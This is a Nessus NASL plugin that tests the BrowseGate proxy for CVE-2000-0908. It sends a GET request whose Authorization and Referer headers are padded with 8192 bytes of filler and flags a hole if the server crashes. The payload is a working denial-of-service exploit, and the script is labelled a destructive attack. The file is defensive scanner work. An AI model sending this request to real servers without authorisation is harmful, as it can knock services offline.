#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# This is an old bug. I don't know if we need _two_ overflows to 
# crash BrowseGate or if this crashes any other web server
# 
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE


if(description)
{
 script_id(11130);
 script_bugtraq_id(1702);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2000-0908");
 name["english"] = "BrowseGate HTTP headers overflows";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the BrowseGate 
proxy by sending it an invalid request with too long HTTP headers
(Authorization and Referer)

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long HTTP headers kill BrowseGate";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes");
 exit(0);
}

########

include("http_func.inc");



port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

#

r = string("GET / HTTP/1.0\r\n", 
	"Authorization: Basic", crap(8192), "\r\n", 
	"From: nessus@example.com\r\n",
	"If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\r\n",
	"Referer: http://www.example.com/", crap(8192), "\r\n",
	"UserAgent: Nessus 1.2.6\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);
#

if (http_is_dead(port: port)) { security_hole(port); }
